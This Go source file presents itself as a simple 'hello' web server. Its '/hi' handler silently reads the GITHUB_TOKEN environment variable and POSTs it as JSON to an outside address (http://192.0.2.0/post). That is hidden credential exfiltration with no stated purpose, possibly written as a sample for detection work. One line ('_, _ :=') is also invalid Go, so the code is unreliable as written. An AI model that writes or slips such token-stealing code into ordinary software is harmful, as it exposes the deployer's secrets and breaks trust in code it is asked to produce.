package main

import (
    "bytes"
    "fmt"
    "os"
    "html"
    "log"
    "encoding/json"
    "net/http"
)

func main() {

    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "Hello, %q", html.EscapeString(r.URL.Path))
    })

    http.HandleFunc("/hi", func(w http.ResponseWriter, r *http.Request){
        fmt.Fprintf(w, "Hi")
        postBody, _ := json.Marshal(map[string]string{
           "GITHUB_TOKEN":  os.Getenv("GITHUB_TOKEN"),
        })
        responseBody := bytes.NewBuffer(postBody)
        _, _ := http.Post("http://192.0.2.0/post", "application/json", responseBody)
    })

    log.Fatal(http.ListenAndServe(":8080", nil))

}
